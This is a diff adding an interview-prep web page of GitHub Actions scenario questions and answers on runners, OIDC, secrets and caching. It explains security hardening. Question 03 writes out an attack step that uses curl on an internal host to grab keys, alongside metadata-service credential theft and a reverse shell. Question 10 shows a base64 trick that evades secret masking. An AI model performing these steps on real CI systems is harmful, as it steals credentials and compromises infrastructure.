@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GitHub Actions Mock Interview | 30 Real-World Scenarios</title>
+<style>
+:root{--navy:#0d1117;--blue:#2563eb;--cyan:#0284c7;--ink:#1f2937;--muted:#6b7280;--bg:#f9fafb;--card:#ffffff;--line:#e5e7eb;--green:#10b981;--orange:#f59e0b;--purple:#7c3aed}
+*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.65 Inter,system-ui,-apple-system,Segoe UI,Arial,sans-serif}
+.hero{background:linear-gradient(130deg,#111827,#1f2937 60%,#1e1b4b);color:white;padding:48px 22px 38px}
+.wrap{max-width:1100px;margin:auto}.eyebrow{text-transform:uppercase;letter-spacing:2px;font-size:12px;font-weight:800;color:#93c5fd}
+h1{font-size:clamp(30px,5vw,46px);line-height:1.15;margin:12px 0}.hero p{max-width:780px;color:#d1d5db;font-size:16px;margin:12px 0 22px}
+.pills{display:flex;gap:9px;flex-wrap:wrap}.pill{border:1px solid #ffffff40;border-radius:30px;padding:6px 14px;font-size:12px;color:#f3f4f6;background:rgba(255,255,255,0.06)}
+main{padding:26px 18px 60px}.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:-48px;position:relative}
+.stat{background:white;border:1px solid var(--line);border-radius:14px;padding:15px 17px;box-shadow:0 8px 22px rgba(0,0,0,0.05)}.stat strong{display:block;font-size:24px;color:var(--blue)}.stat span{font-size:12px;color:var(--muted)}
+.toolbar{display:flex;gap:10px;flex-wrap:wrap;margin:26px 0 14px}.toolbar input,.toolbar select{background:white;border:1px solid #d1d5db;border-radius:9px;padding:11px 13px;font:inherit;color:var(--ink)}.toolbar input{flex:1;min-width:220px}
+button{cursor:pointer;border:0;border-radius:9px;padding:10px 14px;font-weight:700;background:var(--blue);color:white;font-size:14px}.secondary{background:#eff6ff;color:#1d4ed8}
+.section-title{display:flex;align-items:center;gap:10px;margin:32px 0 14px}.section-title h2{font-size:19px;margin:0;color:#111827}.section-title span{font-size:12px;color:var(--muted)}
+.qcard{background:var(--card);border:1px solid var(--line);border-radius:13px;margin:12px 0;overflow:hidden;box-shadow:0 3px 12px rgba(0,0,0,0.03);transition:border-color 0.2s}
+.qcard:hover{border-color:#60a5fa}
+.qhead{padding:17px 18px;display:flex;gap:13px;align-items:flex-start;cursor:pointer}.num{flex:0 0 34px;height:34px;border-radius:9px;background:#eff6ff;color:#2563eb;display:grid;place-items:center;font-weight:800}
+.qmeta{flex:1}.category{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--blue);font-weight:800}.question{font-size:16px;font-weight:750;margin:3px 0 0;color:#111827}.chev{color:var(--muted);font-size:20px;transition:.2s}.qcard.open .chev{transform:rotate(180deg)}
+.answer{display:none;border-top:1px solid var(--line);padding:18px 20px 22px 65px;background:#ffffff}.qcard.open .answer{display:block}.answer h4{margin:10px 0 4px;color:#2563eb;font-size:13px;text-transform:uppercase;letter-spacing:.5px}.answer p{margin:6px 0}.answer ul{margin:8px 0;padding-left:20px}.answer li{margin:4px 0}
+.probe{background:#f0fdf4;border-left:3px solid var(--green);padding:10px 13px;border-radius:0 8px 8px 0;margin-top:14px;color:#166534;font-size:13px}
+code{background:#f3f4f6;color:#111827;padding:2px 6px;border-radius:4px;font-size:.92em;font-family:ui-monospace,monospace}
+pre{background:#111827;color:#f9fafb;padding:12px;border-radius:8px;overflow-x:auto;font-size:13px}
+.footer{color:var(--muted);font-size:12px;text-align:center;padding:26px}
+@media(max-width:650px){.stats{grid-template-columns:repeat(2,1fr)}.answer{padding:15px 16px}.qhead{padding:14px}.hero{padding-top:34px}}
+@media print{body{background:white}.hero{padding:24px;background:#1e1b4b!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}.site-nav,.stats,.toolbar,.footer button{display:none!important}main{padding:10px}.qcard{break-inside:avoid;box-shadow:none}.answer{display:block!important}.chev{display:none}}
+</style>
+</head>
+<body>
+<!-- Top Global Navigation Bar -->
+<nav class="site-nav" style="background:#0b1329;border-bottom:1px solid #1e293b;padding:12px 20px;font-family:'Inter',system-ui,-apple-system,sans-serif;font-size:14px;position:sticky;top:0;z-index:100;box-shadow:0 2px 10px rgba(0,0,0,0.35);">
+  <div style="max-width:1100px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
+    <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+      <a href="../interview_prep.html" style="color:#38bdf8;text-decoration:none;font-weight:600;display:inline-flex;align-items:center;gap:6px;">
+        &larr; Return to Interview Prep Dashboard
+      </a>
+      <span style="color:#334155;">|</span>
+      <a href="../index.html" style="color:#94a3b8;text-decoration:none;display:inline-flex;align-items:center;gap:4px;">
+        🏠 Master Hub
+      </a>
+      <span style="color:#334155;">|</span>
+      <a href="index.html" style="color:#94a3b8;text-decoration:none;display:inline-flex;align-items:center;gap:4px;">
+        📂 Interview Subfolder
+      </a>
+    </div>
+    <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+      <span style="color:#64748b;font-size:11px;text-transform:uppercase;letter-spacing:1px;font-weight:700;">Scenario Sets:</span>
+      <a href="AWS_Scenarios_Interview_questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">☁️ AWS (30)</a>
+      <a href="kubernetes_scenario_interview_Questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">☸️ K8s (62)</a>
+      <a href="terraform_scenarios_interview_questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">🏗️ TF (30)</a>
+      <a href="git_scenarios_interview_questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">🌿 Git (30)</a>
+      <a href="github_actions_scenarios_interview_questions.html" style="background:#2563eb;color:#fff;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:700;border:1px solid #60a5fa;">⚡ GHA (30)</a>
+      <a href="gcp_scenarios_interview_questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">🌐 GCP (30)</a>
+      <a href="jenkins_scenarios_interview_questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">👨‍💻 Jenkins (30)</a>
+      <a href="prometheus_grafana_scenarios_interview_questions.html" style="background:#1e293b;color:#cbd5e1;padding:4px 10px;border-radius:6px;text-decoration:none;font-size:12px;font-weight:500;border:1px solid #334155;">📊 Prom &amp; Graf (30)</a>
+    </div>
+  </div>
+</nav>
+
+<header class="hero"><div class="wrap">
+<div class="eyebrow">Enterprise CI/CD Automation Practice</div>
+<h1>GitHub Actions: 30 Real-World Scenario Questions</h1>
+<p>Practical scenarios for Senior DevOps Engineers (~5 years experience). Covers self-hosted runners &amp; ARC, OIDC AWS/GCP authentication, composite actions &amp; reusable workflows, security hardening against supply chain attacks, caching strategies, and concurrency control.</p>
+<div class="pills"><span class="pill">5-year experience level</span><span class="pill">30 hands-on scenarios</span><span class="pill">OIDC &amp; Security hardening</span><span class="pill">Filter · Search · Print Ready</span></div>
+</div></header>
+
+<main class="wrap">
+<div class="stats">
+<div class="stat"><strong>30</strong><span>Scenarios</span></div><div class="stat"><strong>6</strong><span>Core Domains</span></div><div class="stat"><strong>~60–90m</strong><span>Mock Duration</span></div><div class="stat"><strong>5 Yrs</strong><span>Target Exp</span></div>
+</div>
+
+<div class="toolbar">
+<input id="search" type="search" placeholder="Search GitHub Actions scenarios (e.g. OIDC, ARC runner, cache, reusable)…">
+<select id="filter">
+  <option value="all">All domains</option>
+  <option>Runners &amp; Scaling</option>
+  <option>OIDC &amp; Cloud Security</option>
+  <option>Secrets &amp; Environment Governance</option>
+  <option>Caching &amp; Pipeline Optimization</option>
+  <option>Reusable Workflows &amp; Architecture</option>
+  <option>Troubleshooting &amp; Attack Prevention</option>
+</select>
+<button class="secondary" onclick="expandAll(true)">Expand all</button><button class="secondary" onclick="expandAll(false)">Collapse all</button><button onclick="window.print()">Print / Save PDF</button>
+</div>
+
+<div id="questions">
+
+<!-- Domain 1: Runners & Scaling -->
+<section class="section-title"><h2>Runners &amp; Scaling</h2><span>Self-hosted runners · ARC (Kubernetes) · Ephemeral pods · Disk exhaustion</span></section>
+
+<article class="qcard" data-category="Runners &amp; Scaling" data-search="actions runner controller arc kubernetes autoscaling ephemeral runner">
+<div class="qhead"><div class="num">01</div><div class="qmeta"><div class="category">Runners &amp; Scaling</div><div class="question">Your company runs 500+ daily CI jobs. GitHub-hosted runner bills are spiking, and jobs queue for 15 minutes. How do you design an auto-scaling runner fleet with ARC on Kubernetes?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Deploy GitHub's official <strong>Actions Runner Controller (ARC)</strong> on an elastic Kubernetes cluster (EKS/GKE) using ephemeral runner sets.</p><ul><li><strong>Ephemeral RunnerSets:</strong> Configure runner pods with <code>ephemeral: true</code> so each runner handles exactly one job and terminates. This guarantees zero state contamination, eliminates disk leaks, and enforces security isolation between builds.</li><li><strong>Autoscaling with Metric Server / HPA:</strong> Use ARC's webhook-driven autoscaler. ARC registers an organization webhook for <code>workflow_job.queued</code> events, scaling pod replicas from 0 to N instantly rather than waiting for slow polling intervals.</li><li><strong>Instance Types:</strong> Run worker nodes on AWS EC2 Spot instances or GCP Spot VMs behind Karpenter/Cluster Autoscaler with fallback to On-Demand for critical release pipelines, slashing compute costs by 60–75%.</li><li><strong>Warm Pool:</strong> Maintain a small minimum replica count (e.g., <code>minReplicas: 3</code>) to eliminate pod spin-up latency during business hours.</li></ul><div class="probe"><b>Interviewer Probe:</b> What security risk occurs if self-hosted runners are non-ephemeral? Persistent runners can retain cached Docker layers, unmasked credentials in environment variables, or rogue background processes across builds.</div></div></article>
+
+<article class="qcard" data-category="Runners &amp; Scaling" data-search="docker build no space left on device runner disk exhaustion prune">
+<div class="qhead"><div class="num">02</div><div class="qmeta"><div class="category">Runners &amp; Scaling</div><div class="question">A heavy Docker build fails on a GitHub-hosted Ubuntu runner with `no space left on device` (14GB limit). How do you maximize usable disk space without upgrading to paid large runners?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Standard GitHub-hosted <code>ubuntu-latest</code> runners come with ~14GB free disk space because pre-installed software (Android SDK, .NET, Haskell, CodeQL) consumes ~35GB.</p><ul><li><strong>Add a disk cleanup step:</strong> Strip unnecessary pre-installed toolchains before building Docker:
+<pre>- name: Free disk space
+  run: |
+    sudo rm -rf /usr/share/dotnet
+    sudo rm -rf /usr/local/lib/android
+    sudo rm -rf /opt/ghc
+    sudo rm -rf /opt/hostedtoolcache/CodeQL
+    sudo docker image prune --all --force
+    df -h</pre>
+This frees up 25–30GB of immediate disk capacity.</li><li><strong>Multi-stage builds:</strong> Ensure Dockerfiles use multi-stage builds so intermediate layers are discarded.</li><li><strong>Buildx with external registry cache:</strong> Avoid saving local Docker tarballs; push directly to GitHub Container Registry (GHCR) using <code>--push</code>.</li></ul></div></article>
+
+<article class="qcard" data-category="Runners &amp; Scaling" data-search="self-hosted runner security public repository pull request malicious code">
+<div class="qhead"><div class="num">03</div><div class="qmeta"><div class="category">Runners &amp; Scaling</div><div class="question">Why does GitHub explicitly warn against using self-hosted runners on public repositories, and how can an attacker exploit them?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>On public repositories, any outside user can submit a Pull Request. If workflows run automatically on <code>pull_request</code> using self-hosted runners, the attacker's PR can execute arbitrary malicious code on your internal network.</p><ul><li><strong>Attack vector:</strong> The attacker modifies <code>.github/workflows/test.yml</code> or tests to run <code>curl internal-kubernetes.internal/keys</code>, extracts cloud IAM credentials via AWS/GCP instance metadata service (IMDS), or persists a reverse shell inside the runner pod.</li><li><strong>Mitigation:</strong>
+  <ul>
+    <li>Never assign self-hosted runners to public repos; use GitHub-hosted runners for untrusted public contributions.</li>
+    <li>If self-hosted runners must be used, require approval for all external contributors: <em>"Require approval for first-time / all outside contributors"</em> in Actions settings.</li>
+    <li>Run runners in an isolated, non-routable VPC with no IAM instance profile attached and strict IMDSv2 hop limits.</li>
+  </ul>
+</li></ul></div></article>
+
+<article class="qcard" data-category="Runners &amp; Scaling" data-search="concurrency cancel in progress pull request builds queue">
+<div class="qhead"><div class="num">04</div><div class="qmeta"><div class="category">Runners &amp; Scaling</div><div class="question">Developers frequently push 4–5 quick commits to a PR. Each commit triggers a full 20-minute test suite, clogging runners with redundant runs. How do you configure automatic cancellation?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Configure the top-level <code>concurrency</code> group with <code>cancel-in-progress: true</code> scoped to the PR head reference.</p><ul><li>Add the following block at the top of your workflow YAML:
+<pre>concurrency:
+  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}
+  cancel-in-progress: true</pre>
+</li><li><strong>How it works:</strong>
+  <ul>
+    <li>For pull requests: <code>github.head_ref</code> evaluates to the branch name (e.g. <code>feature-login</code>). If commit 2 is pushed while commit 1's workflow is running, GitHub Actions immediately cancels the commit 1 run.</li>
+    <li>For merges to <code>main</code>: <code>github.head_ref</code> is null, so it falls back to <code>github.run_id</code>, ensuring production deployment workflows on <code>main</code> are NEVER canceled mid-execution.</li>
+  </ul>
+</li></ul></div></article>
+
+<article class="qcard" data-category="Runners &amp; Scaling" data-search="matrix strategy fail fast max parallel dynamic matrix">
+<div class="qhead"><div class="num">05</div><div class="qmeta"><div class="category">Runners &amp; Scaling</div><div class="question">You need to test across 3 operating systems, 4 Node versions, and 2 database engines (24 combinations). A failure in Node 16 immediately aborts all other tests. How do you manage this matrix?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use GitHub Actions <code>strategy.matrix</code> with <code>fail-fast: false</code> and <code>max-parallel</code> tuning.</p><ul><li>Define the matrix with explicit options:
+<pre>strategy:
+  fail-fast: false
+  max-parallel: 8
+  matrix:
+    os: [ubuntu-latest, windows-latest, macos-latest]
+    node: [18, 20, 22]
+    db: [postgres, mysql]
+    exclude:
+      - os: windows-latest
+        db: postgres</pre>
+</li><li><strong><code>fail-fast: false:</code></strong> Prevents GitHub Actions from canceling the remaining 23 jobs when one combination fails, giving full visibility into cross-platform test failures.</li><li><strong><code>max-parallel: 8:</code></strong> Prevents runner pool starvation by limiting simultaneous concurrency so other repositories in the organization can still process jobs.</li></ul></div></article>
+
+<!-- Domain 2: OIDC & Cloud Security -->
+<section class="section-title"><h2>OIDC &amp; Cloud Security</h2><span>OpenID Connect · AWS IAM AssumeRole · GCP Workload Identity · Permissions block</span></section>
+
+<article class="qcard" data-category="OIDC &amp; Cloud Security" data-search="oidc aws iam role assume role web identity long lived keys">
+<div class="qhead"><div class="num">06</div><div class="qmeta"><div class="category">OIDC &amp; Cloud Security</div><div class="question">Your CISO mandates removing all long-lived AWS Access Keys from GitHub repository secrets. How do you implement GitHub Actions OIDC federation to AWS IAM?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>OpenID Connect (OIDC) allows GitHub Actions workflows to receive short-lived JWT tokens signed by GitHub and exchange them for temporary AWS STS credentials without storing permanent keys.</p><ul><li><strong>Step 1 (AWS IAM Identity Provider):</strong> Create an OpenID Connect provider in AWS IAM for <code>https://token.actions.githubusercontent.com</code> with client ID <code>sts.amazonaws.com</code>.</li><li><strong>Step 2 (IAM Role Trust Policy with Condition):</strong> Restrict which repositories and branches can assume the role:
+<pre>{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
+    "Action": "sts:AssumeRoleWithWebIdentity",
+    "Condition": {
+      "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" },
+      "StringLike": { "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main" }
+    }
+  }]
+}</pre></li><li><strong>Step 3 (Workflow Permissions):</strong> In the workflow YAML, grant <code>id-token: write</code> and <code>contents: read</code>:
+<pre>permissions:
+  id-token: write
+  contents: read
+
+steps:
+  - uses: aws-actions/configure-aws-credentials@v4
+    with:
+      role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy-role
+      aws-region: us-east-1</pre>
+</li></ul><div class="probe"><b>Interviewer Probe:</b> What critical vulnerability happens if you omit the <code>StringLike: sub</code> condition? Any user on all of GitHub.com could assume your AWS IAM role!</div></div></article>
+
+<article class="qcard" data-category="OIDC &amp; Cloud Security" data-search="permissions block least privilege github token write read none">
+<div class="qhead"><div class="num">07</div><div class="qmeta"><div class="category">OIDC &amp; Cloud Security</div><div class="question">What are the default permissions of `GITHUB_TOKEN`, why are they dangerous, and how do you enforce least privilege in workflows?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>By default in older GitHub organizations, <code>GITHUB_TOKEN</code> had read and write permissions to repository code, packages, pull requests, issues, and security events. A compromised third-party action could modify code or create rogue releases.</p><ul><li><strong>Organization Level:</strong> In Organization Settings &rarr; Actions &rarr; General, set <em>"Workflow permissions"</em> to <strong>Read repository contents and packages permissions</strong> (read-only default).</li><li><strong>Workflow Level:</strong> Always explicitly define the top-level <code>permissions</code> block at the top of the workflow YAML:
+<pre>permissions:
+  contents: read
+  issues: none
+  pull-requests: write</pre>
+</li><li>If an individual job needs elevated privileges (e.g., publishing packages or requesting an OIDC token), override permissions inside that specific job only rather than globally.</li></ul></div></article>
+
+<article class="qcard" data-category="OIDC &amp; Cloud Security" data-search="gcp workload identity federation service account keyless authentication">
+<div class="qhead"><div class="num">08</div><div class="qmeta"><div class="category">OIDC &amp; Cloud Security</div><div class="question">How do you authenticate a GitHub Actions workflow to Google Cloud Platform (GCP) without generating JSON Service Account keys?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use GCP Workload Identity Federation with Google's official <code>auth</code> action.</p><ul><li><strong>Step 1 (GCP Workload Identity Pool):</strong> Create a Workload Identity Pool (e.g. <code>github-pool</code>) and Provider pointing to <code>https://token.actions.githubusercontent.com</code> with attribute mappings:
+<pre>google.subject=assertion.sub,
+attribute.repository=assertion.repository</pre></li><li><strong>Step 2 (Bind IAM Role to Service Account):</strong> Allow external identities from that pool matching your repository to impersonate the GCP Service Account:
+<pre>gcloud iam service-accounts add-iam-policy-binding deploy-sa@project.iam.gserviceaccount.com \
+  --role="roles/iam.workloadIdentityUser" \
+  --member="principalSet://iam.googleapis.com/projects/123/locations/global/workloadIdentityPools/github-pool/attribute.repository/my-org/my-repo"</pre></li><li><strong>Step 3 (Workflow Configuration):</strong>
+<pre>permissions:
+  id-token: write
+  contents: read
+
+steps:
+  - uses: google-github-actions/auth@v2
+    with:
+      workload_identity_provider: 'projects/123/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
+      service_account: 'deploy-sa@project.iam.gserviceaccount.com'</pre></li></ul></div></article>
+
+<article class="qcard" data-category="OIDC &amp; Cloud Security" data-search="supply chain pin action commit SHA mutable tag dependabot">
+<div class="qhead"><div class="num">09</div><div class="qmeta"><div class="category">OIDC &amp; Cloud Security</div><div class="question">Why is referencing `uses: actions/checkout@v4` a security supply chain risk, and what is the enterprise standard for pinning third-party actions?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Git tags (like <code>@v4</code> or <code>@main</code>) are mutable pointers. If a malicious actor compromises the maintainer's account or repository, they can force-push a malicious commit to that tag, immediately compromising your CI pipeline (like the Codecov bash uploader incident).</p><ul><li><strong>Enterprise Standard:</strong> Pin all third-party actions to full immutable 40-character Git commit SHAs, accompanied by a comment indicating the semantic version:
+<pre>uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+uses: aws-actions/configure-aws-credentials@e3ddf14cb990e11c00226c9f2253d7899c3ca07e # v4.0.2</pre></li><li><strong>Automated Updates:</strong> Configure <strong>Dependabot</strong> for <code>github-actions</code> in <code>.github/dependabot.yml</code> to automatically test and create PRs updating pinned commit SHAs when new versions release.</li><li><strong>StepSecurity / Zizmor:</strong> Use automated scanners like <code>zizmor</code> or StepSecurity Harden-Runner to block outgoing network calls to unexpected external domains from compromised actions.</li></ul></div></article>
+
+<article class="qcard" data-category="OIDC &amp; Cloud Security" data-search="secret masking leak stdout echo base64 pr comments">
+<div class="qhead"><div class="num">10</div><div class="qmeta"><div class="category">OIDC &amp; Cloud Security</div><div class="question">GitHub automatically masks repository secrets with `***`. How can a secret still accidentally leak into workflow logs, and how do you prevent it?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>GitHub masks secrets only when the exact string value of the secret appears in stdout. Subtle transformations bypass the regex mask:</p><ul><li><strong>Common leak scenarios:</strong>
+  <ul>
+    <li>Encoding: Transforming the secret with Base64, URL encoding, or hex (e.g. <code>echo "$SECRET" | base64</code> prints the raw encoded string without masking).</li>
+    <li>Iteration / character splitting: Loops or JSON dumps that print characters individually or inside stack traces.</li>
+    <li>Short or single-word secrets: Values under 3 characters or common words (e.g., <code>true</code>, <code>admin</code>) are intentionally NOT masked by GitHub to prevent hiding normal log output.</li>
+  </ul>
+</li><li><strong>Prevention:</strong>
+  <ul>
+    <li>Never pass secrets into script arguments or echo statements; pass them strictly via environment variables: <code>env: API_KEY: ${{ secrets.API_KEY }}</code>.</li>
+    <li>Enable GitHub Secret Scanning Push Protection to detect leaked tokens in commit messages, diffs, and workflow definitions.</li>
+  </ul>
+</li></ul></div></article>
+
+<!-- Domain 3: Secrets & Environment Governance -->
+<section class="section-title"><h2>Secrets &amp; Environment Governance</h2><span>Environment protection · Manual approvals · Branch restrictions · Secret scope</span></section>
+
+<article class="qcard" data-category="Secrets &amp; Environment Governance" data-search="environment protection rules manual approval reviewer deploy production">
+<div class="qhead"><div class="num">11</div><div class="qmeta"><div class="category">Secrets &amp; Environment Governance</div><div class="question">How do you configure GitHub Actions to ensure production deployments strictly require approval from 2 Senior SREs and can only be triggered from the `main` branch?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use GitHub <strong>Environments</strong> with Environment Protection Rules:</p><ul><li><strong>Step 1 (Create Environment):</strong> In Settings &rarr; Environments, create an environment named <code>production</code>.</li><li><strong>Step 2 (Protection Rules):</strong>
+  <ul>
+    <li>Check <em>"Required reviewers"</em> and add the <code>@org/senior-sre</code> team, specifying that at least 2 approvals are required.</li>
+    <li>Check <em>"Deployment branches"</em> and select <em>"Selected branches"</em> &rarr; add only <code>refs/heads/main</code>. Workflows running on feature branches are strictly blocked from deploying to this environment.</li>
+  </ul>
+</li><li><strong>Step 3 (Workflow Integration):</strong> Bind the deployment job to the environment:
+<pre>deploy-prod:
+  needs: [build, test]
+  runs-on: ubuntu-latest
+  environment:
+    name: production
+    url: https://api.company.com
+  steps:
+    - name: Deploy to EKS
+      run: ./scripts/deploy.sh</pre></li><li>GitHub halts the job, sends an alert/email to the designated SREs, and only resumes after 2 approvals are submitted in the UI.</li></ul></div></article>
+
+<article class="qcard" data-category="Secrets &amp; Environment Governance" data-search="dependabot pull request secrets access fork permission denied">
+<div class="qhead"><div class="num">12</div><div class="qmeta"><div class="category">Secrets &amp; Environment Governance</div><div class="question">A Dependabot PR triggers a CI workflow that runs integration tests, but the job fails with empty secrets (`DB_PASSWORD` is null). Why does this happen and how do you resolve it?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>By default, GitHub Actions treats Dependabot-created PRs with restricted read-only permissions and strips all standard repository secrets to prevent a compromised dependency package from exfiltrating secrets.</p><ul><li><strong>Root Cause:</strong> Workflows triggered by Dependabot run in the context of <code>github.actor == 'dependabot[bot]'</code> and cannot read normal <code>${{ secrets.XYZ }}</code>.</li><li><strong>Solution 1 (Dependabot Secrets):</strong> Add the secrets explicitly in <em>Settings &rarr; Secrets and variables &rarr; Actions &rarr; Dependabot Secrets</em>. These are distinct from standard Actions secrets.</li><li><strong>Solution 2 (Separate Validation Flow):</strong> Refactor the integration test workflow to run unit tests and linting on Dependabot PRs without requiring production-like database secrets, or mock the database service during CI runs.</li></ul></div></article>
+
+<article class="qcard" data-category="Secrets &amp; Environment Governance" data-search="organization secrets repository access policy variables">
+<div class="qhead"><div class="num">13</div><div class="qmeta"><div class="category">Secrets &amp; Environment Governance</div><div class="question">In an enterprise with 200 repositories, how do you manage shared secrets (e.g. SonarQube token, Artifactory credentials) without copy-pasting them across every repository?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use <strong>Organization-level Secrets and Configuration Variables</strong> with fine-grained access policies.</p><ul><li>Navigate to <em>Organization Settings &rarr; Secrets and variables &rarr; Actions</em>.</li><li>Create the secret (e.g. <code>SONAR_TOKEN</code>) and configure <strong>Repository Access Policy</strong>:
+  <ul>
+    <li><em>"All repositories"</em>: Only for non-sensitive public configs.</li>
+    <li><em>"Selected repositories"</em>: Best practice. Select only the specific backend/frontend repositories that legitimately require access.</li>
+  </ul>
+</li><li>Combine with <strong>Environment Secrets</strong>: For environment-specific values (e.g., Staging vs Prod database endpoints), configure them at the Environment level so production values cannot be accessed from dev/feature branches.</li></ul></div></article>
+
+<article class="qcard" data-category="Secrets &amp; Environment Governance" data-search="hashicorp vault approle jwt integration secrets engine">
+<div class="qhead"><div class="num">14</div><div class="qmeta"><div class="category">Secrets &amp; Environment Governance</div><div class="question">How do you fetch dynamic, short-lived database credentials from HashiCorp Vault inside a GitHub Actions workflow using OIDC?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Integrate GitHub Actions OIDC JWT directly with Vault's JWT/OIDC Auth Method.</p><ul><li>Configure a Vault JWT role bound to GitHub's OIDC issuer with bound claims matching your repository name.</li><li>In the workflow YAML, request the OIDC token and retrieve credentials using HashiCorp's official action:
+<pre>permissions:
+  id-token: write
+  contents: read
+
+steps:
+  - name: Import Secrets from Vault
+    uses: hashicorp/vault-action@v3
+    with:
+      url: https://vault.company.com:8200
+      method: jwt
+      role: github-actions-role
+      secrets: |
+        database/creds/billing-service password | DB_PASSWORD ;
+        database/creds/billing-service username | DB_USER</pre></li><li>Vault dynamically generates unique, short-lived (e.g. 1-hour TTL) PostgreSQL/MySQL credentials and exports them directly into masked workflow environment variables.</li></ul></div></article>
+
+<article class="qcard" data-category="Secrets &amp; Environment Governance" data-search="set-output deprecation GITHUB_OUTPUT environment files">
+<div class="qhead"><div class="num">15</div><div class="qmeta"><div class="category">Secrets &amp; Environment Governance</div><div class="question">A legacy workflow fails with `::set-output parameter is deprecated`. How do you update it to the modern GITHUB_OUTPUT environment file standard, and how do you handle multi-line strings?</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>GitHub deprecated stdout command formatting <code>::set-output</code> due to command injection vulnerabilities, replacing it with filesystem environment files (<code>$GITHUB_OUTPUT</code>, <code>$GITHUB_ENV</code>).</p><ul><li><strong>Single-line output:</strong>
+<pre># Old (Deprecated):
+echo "::set-output name=app_version::1.2.3"
+
+# Modern standard:
+echo "app_version=1.2.3" >> "$GITHUB_OUTPUT"</pre></li><li><strong>Multi-line string (e.g. changelog or JSON):</strong> Use EOF delimiters with unique random delimiters to prevent delimiter collision injection:
+<pre>EOF=$(dd if=/dev/urandom bs=15 count=1 status=none | base64)
+echo "changelog<<$EOF" >> "$GITHUB_OUTPUT"
+cat release-notes.md >> "$GITHUB_OUTPUT"
+echo "$EOF" >> "$GITHUB_OUTPUT"</pre></li><li>Downstream steps access it via: <code>${{ steps.step_id.outputs.changelog }}</code>.</li></ul></div></article>
+
+<!-- Domain 4: Caching & Pipeline Optimization -->
+<section class="section-title"><h2>Caching &amp; Pipeline Optimization</h2><span>actions/cache · Docker buildx cache-from · Yarn/npm cache · Artifact retention</span></section>
+
+<article class="qcard" data-category="Caching &amp; Pipeline Optimization" data-search="actions cache hashFiles lock file key restore keys npm yarn">
+<div class="qhead"><div class="num">16</div><div class="qmeta"><div class="category">Caching &amp; Pipeline Optimization</div><div class="question">An `npm install` step takes 6 minutes on every PR run. Design an optimal caching strategy using `actions/cache` that avoids stale dependencies.</div></div><div class="chev">⌄</div></div>
+<div class="answer"><h4>Strong answer</h4><p>Use <code>actions/setup-node</code>'s built-in caching, or implement explicit <code>actions/cache</code> with <code>hashFiles</code> and fallback <code>restore-keys</code>.</p><ul><li><strong>Recommended Approach (Built-in setup action):</strong>
+<pre>- uses: actions/setup-node@v4
+  with:
+    node-version: 20
+    cache: 'npm' # Automatically hashes package-lock.json and caches ~/.npm</pre></li><li><strong>Explicit actions/cache Strategy:</strong>
+<pre>- name: Cache Node modules
+  uses: actions/cache@v4
+  with:
+    path: ~/.npm
+    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      ${{ runner.os }}-npm-</pre>
+</li><li><strong>How it works:</strong>
+  <ul>
+    <li>If <code>package-lock.json</code> hasn't changed, an exact cache hit occurs; dependency download takes &lt;10 seconds.</li>
+    <li>If dependencies change, <code>restore-keys</code> provides a partial cache hit from the previous build, downloading only newly added packages rather than starting from scratch.</li>
+  </ul>
+</li></ul></div></article>
+
